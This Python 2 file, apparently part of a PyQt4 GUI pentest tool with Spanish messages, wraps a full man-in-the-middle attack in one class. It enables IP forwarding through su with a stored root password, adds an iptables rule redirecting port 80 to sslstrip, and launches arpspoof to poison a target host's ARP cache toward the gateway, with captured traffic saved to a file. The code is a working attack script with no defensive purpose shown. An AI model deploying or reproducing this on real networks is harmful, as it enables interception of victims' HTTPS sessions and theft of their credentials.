# -*- coding: utf-8 -*-

from PyQt4.QtCore import QObject, pyqtSignal
from threading import Thread
from pexpect import run, spawn
from time import sleep
import sys

class SSLStrip(QObject):
    
    fin = pyqtSignal()
    texto = pyqtSignal(str, name='texto')
    
    def __init__(self, interfaz, rhost, gateway, passwd, matarSesiones):
        QObject.__init__(self)
        
        self.interfaz = interfaz.replace("\r", "")
        self.rhost = rhost.replace("\r", "")
        self.gateway = gateway.replace("\r", "")
        self.passwd = passwd.replace("\r", "")
        self.matarSesiones = matarSesiones
        
    def setup(self):
        self.forward()
        self.iptables()
        
        self.threadSSLStrip = Thread(target=self.sslStrip())
        self.threadSSLStrip.daemon = True
        self.threadSSLStrip.start()
        
        self.threadARPSpoof = Thread(target=self.arpSpoof())
        self.threadARPSpoof.daemon = True
        self.threadARPSpoof.start()
        
    def forward(self):
        self.texto.emit("[*] Activando Forwarding")
        
        cmd = 'echo "1" > /proc/sys/net/ipv4/ip_forward'
        print cmd
        
        try:
            child = spawn("su")
            sleep(1)
            child.sendline(self.passwd)
            sleep(1)
            child.sendline(cmd)
        
        except Exception as e:
            sys.exit("[-] ERROR:", e)        
        
        stdout = run("cat /proc/sys/net/ipv4/ip_forward")
        
        if int(stdout) == 1:
            self.texto.emit("[+] OK")        
        else:
            sys.exit("[-] ERROR (cat /proc/sys/net/ipv4/ip_forward -> " + stdout + ")")

    def iptables(self):
        self.texto.emit("[*] Configurando iptables para redirigir el trafico HTTP a sslstrip")
        
        cmd = "iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 10000"
        print cmd
        
        try:
            child = spawn("su")
            sleep(1)
            child.sendline(self.passwd)
            sleep(1)
            child.sendline(cmd)
        
        except Exception as e:
            sys.exit("[-] ERROR:", e)
        
        self.texto.emit("[+] OK")
    
    def sslStrip(self):
        self.texto.emit("[*] Iniciando SSLStrip")
        
        if self.matarSesiones:
            cmd = "sslstrip -w cap -k -l 10000"
        else:
            cmd = "sslstrip -w cap -l 10000"
        
        print cmd
        
        try:
            self.childSSLStrip = spawn(cmd)
        
        except Exception as e:
            sys.exit("[-] ERROR:", e)
        
        self.texto.emit("[+] OK (Guardando datos en el archivo 'cap')")
    
    def arpSpoof(self):  
        self.texto.emit("[*] Iniciando ARPSPoof")
        
        cmd = "arpspoof -i " + self.interfaz + " -t " + self.rhost + " " + self.gateway
        print cmd
        
        try:
            self.childARPSpoof = spawn("su")
            sleep(1)
            self.childARPSpoof.sendline(self.passwd)
            sleep(1)
            self.childARPSpoof.sendline(cmd)
            
        except Exception as e:
            sys.exit("[-] ERROR:", e)
        
        self.texto.emit("[+] OK")
    
    def parar(self):
        self.texto.emit("[*] Finalizando de SSLStrip")
        try:
            self.childSSLStrip.close()
            self.childARPSpoof.close()
        except Exception as e:
            sys.exit("[-] ERROR:", e)
        self.texto.emit("[+] OK")        
        self.fin.emit()
    
        